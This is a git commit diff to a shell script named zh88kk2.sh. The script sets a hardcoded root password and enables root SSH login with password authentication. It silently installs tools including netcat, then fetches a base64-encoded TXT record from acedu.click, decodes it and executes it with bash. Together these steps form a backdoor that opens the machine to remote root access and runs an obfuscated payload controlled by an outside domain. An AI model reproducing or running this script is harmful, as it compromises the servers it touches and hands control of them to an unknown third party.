3f251a762ce4c10def304547d5541451cd757901
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2025-02-28 17:26:24 +0800

    Update zh88kk2.sh

--- zh88kk2.sh
+++ zh88kk2.sh
@@ -3,6 +3,7 @@ echo root:acedu.click.54321 | sudo chpasswd root
 sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 sudo service sshd restart
-sudo apt-get update
-sudo apt-get install jq -y
+# Debian12+
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1
 bash <(host -t txt acedu.click |cut -d'"' -f2 |base64 -d)
